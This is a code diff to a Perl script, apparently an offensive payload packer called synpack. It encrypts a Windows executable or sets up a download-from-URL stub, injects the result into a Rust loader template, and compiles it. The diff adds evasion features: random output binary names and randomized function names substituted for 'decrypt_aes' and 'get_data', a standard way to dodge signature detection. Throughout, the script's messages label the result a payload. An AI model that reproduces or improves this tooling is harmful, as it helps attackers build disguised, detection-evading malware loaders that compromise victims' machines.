@@ -87,12 +87,17 @@ sub hex_format_data {
 sub gen_random_string {
     my $str_len = shift;
 
-    my @chars = ('a'..'z', 'A'..'Z');
+    my @chars = ('a'..'z', '_');
     my $rand_str;
     foreach (1..$str_len) {
         $rand_str .= $chars[rand @chars];
     }
     return $rand_str;
+}
+
+sub purge_builds {
+    unlink(glob("'.\\output\\*'"));
+    system("cargo clean");
 }
 
 
@@ -102,32 +107,49 @@ my $usage = qq{
 Usage: perl .\\synpack.pl <path or url to exe> <arguments>
 (You can also omit the arguments and pass them directly to the binary)
 };
-my $filepath  = shift @ARGV or die($usage);
+my $filepath  = shift @ARGV or die $usage;
 my $exe_args  = shift @ARGV or "";
 my $encrypt   = 0;
 my $web       = 0;
 my $url       = "";
 
 if (substr($filepath, 0, 4) eq "http") {
-    $web = 1;
     $url = $filepath;
     c_print("[?] Do you want to encrypt the remote payload? (y/N) ");
     my $resp = <>;
-    chomp($resp);
+    chomp $resp ;
     if (lc($resp) eq "y") {
         $encrypt = 1;
         c_print("[+] Enter filepath to exe without quotes: ");
         $filepath = <>;
-        chomp($filepath);
+        chomp $filepath ;
     }
 }
+
+c_print("[?] Do you want to change the output binary name? (default: random string) (y/N) ");
+my $binary_name = gen_random_string(8);
+my $resp = <>;
+chomp $resp;
+if (lc($resp) eq "y") {
+    c_print("[+] Enter name without file extention: ");
+    $binary_name = <>;
+    chomp $binary_name;
+}
+
+c_print("[+] Updating project name to: ", "$binary_name\n", BRIGHT_GREEN);
+
+copy("template.toml", "Cargo.toml") or die("Copy failed: $!\n");
+my $cargo_conf = path(".\\Cargo.toml");
+my $conf_replace = $cargo_conf->slurp_utf8;
+$conf_replace =~ s/SYNPACK_NAME/$binary_name/g;
+$cargo_conf->spew_utf8($conf_replace);
 
 
 my $hex_data = "";
 my $hex_key  = "";
 my $hex_iv   = "";
 
-if (!$web || ($web && $encrypt)) {
+if (!$url || ($url && $encrypt)) {
 
     c_print("[+] Opening: ", "$filepath\n");
     open(my $file, "<:raw", $filepath) or exit(c_print("[!] Cant open file! ", "$filepath\n", BRIGHT_RED));
@@ -139,7 +161,7 @@ if (!$web || ($web && $encrypt)) {
     $encrypt = 1;
     my ($enc_data, $key, $iv) = aes_encrypt($file_bytes);
     
-    if ($web) {
+    if ($url) {
         my $outfile = gen_random_string(8);
         open(my $out, '>:raw', ".\\output\\$outfile") or exit(c_print("[!] Couldn't save encrypted payload!\n", "", BRIGHT_RED));
         syswrite $out, $enc_data;
@@ -179,24 +201,32 @@ if (!$encrypt) {
     $replace =~ s/decrypt_aes\(&mut bin_data\);//g;
 }
 
-if (!$web) {
-    $replace =~ s/\/\/WEB_START/\/*/g;
-    $replace =~ s/\/\/WEB_END/*\//g;
-}
+my $random_func_name = gen_random_string(12);
+$replace =~ s/decrypt_aes/$random_func_name/g if $encrypt;
 
 if ($url) {
     $replace =~ s/SYNPACK_URL/$url/g;
     $replace =~ s/vec\!\[SYNPACK_DATA\];/get_data().await;/g;
+
+    $random_func_name = gen_random_string(12);
+    $replace =~ s/get_data/$random_func_name/g;
+} else {
+    $replace =~ s/\/\/WEB_START/\/*/g;
+    $replace =~ s/\/\/WEB_END/*\//g;
 }
 
 $template->spew_utf8($replace);
+c_print("[?] Would you like to purge old builds? (Y/n) ");
+$resp = <>;
+chomp $resp;
+purge_builds() if lc($resp) eq "y";
 
 c_print("[+] Compiling, this could take a while...\n");
 
-my $exepath = ".\\target\\release\\synpack.exe";
+my $exepath = ".\\target\\release\\$binary_name.exe";
 unlink($exepath) if -e $exepath;
 
 system("cargo build --release");
 
 c_print("[+] Done! Payload located at: ", "$exepath\n", BRIGHT_GREEN) if -e $exepath;
-c_print("[+] Payload will be downloaded from: ", "$url\n", BRIGHT_GREEN) if -e $exepath;
+c_print("[+] Payload will be downloaded from: ", "$url\n", BRIGHT_BLUE) if -e $exepath;
